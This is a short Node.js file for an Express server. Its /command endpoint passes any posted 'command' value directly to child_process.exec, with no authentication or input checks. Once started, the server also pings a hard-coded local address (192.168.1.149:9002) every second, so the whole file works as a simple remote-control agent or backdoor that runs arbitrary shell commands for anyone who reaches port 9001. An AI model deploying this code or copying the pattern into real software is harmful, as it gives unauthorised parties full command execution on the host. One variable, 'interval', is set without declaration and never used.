const express = require('express');
const bodyParser = require('body-parser');
const exec = require('child_process').exec;
const request = require('request-promise');

const HTTP_SERVER_PORT = 9001;
/**
 * HTTP Server
 */
const app = express();

app.use(bodyParser.urlencoded());

app.post('/command', (req, res) => {
  let command = req.body.command;
  executeCommand(command);
  res.send(':)');
});

app.listen(HTTP_SERVER_PORT, () => {
  console.log('http server running on port %s', HTTP_SERVER_PORT);
  startPinging();
});
/**
 * Execute command
 */
 function executeCommand(command) {
   exec(command, (err, stdout, stderr) => {
     if (err) {
       console.log('exec err', err);
       return;
     }
   });
 }

function startPinging() {
  let pingServerAddress = 'http://192.168.1.149',
      pingServerPort = 9002;
      interval = 1000;

  let options = {
    uri: [pingServerAddress, pingServerPort].join(':'),
    path: '/',
    method: 'GET'
  };

  setInterval(() => {
    request(options).then(response => {
      console.log('response', response);
    }).catch(err => console.log('err', err));
  }, 1000);
}
